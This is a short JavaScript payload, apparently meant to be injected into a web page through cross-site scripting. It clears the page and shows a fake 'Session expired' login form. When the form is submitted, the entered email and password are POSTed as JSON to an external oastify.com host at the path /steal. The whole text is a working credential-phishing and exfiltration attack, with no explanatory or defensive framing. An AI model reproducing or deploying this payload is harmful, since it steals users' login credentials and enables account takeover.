(function() {
  const container = document.createElement("div");
  container.innerHTML = `
    <div style="font-family:sans-serif;padding:20px;">
      <h2>Session expired</h2>
      <p>Please log in again to continue.</p>
      <form id="fakeLogin">
        <input id="user" placeholder="Email" required><br><br>
        <input id="pass" type="password" placeholder="Password" required><br><br>
        <button type="submit">Log In</button>
      </form>
    </div>
  `;
  document.body.innerHTML = ""; // Optional: clear existing content
  document.body.appendChild(container);

  document.getElementById("fakeLogin").addEventListener("submit", function(e) {
    e.preventDefault();
    fetch("https://joboi5is224xx9rpfluze1ydv41vpmka9.oastify.com/steal", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        user: document.getElementById("user").value,
        pass: document.getElementById("pass").value
      })
    });
  });
})();

